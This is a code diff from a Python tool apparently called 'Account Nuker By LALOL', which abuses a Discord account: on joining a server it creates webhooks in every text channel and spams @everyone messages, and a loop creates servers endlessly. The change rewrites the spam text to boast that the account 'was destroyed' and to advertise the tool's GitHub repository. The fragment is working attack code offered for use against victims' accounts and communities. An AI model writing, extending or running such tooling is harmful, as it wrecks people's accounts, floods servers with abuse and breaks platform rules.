@@ -50,7 +50,7 @@ async def on_guild_join(guild):
 		for channel in guild.text_channels:
 			webhook=await channel.create_webhook(name="Account Nuker By LALOL", reason="Account Nuker By LALOL", avatar=icon)
 			for i in range(3):
-				await webhook.send(content="||@everyone||", embed=embed)
+				await webhook.send(content="||@everyone|| This account was destroyed using the Account Nuker by LALOL :clown:\nhttps://github.com/Its-LALOL/Discord-Account-Nuker")
 async def CreateGuild():
 	while True:
 		name='Account Nuker By LALOL '+''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=4))
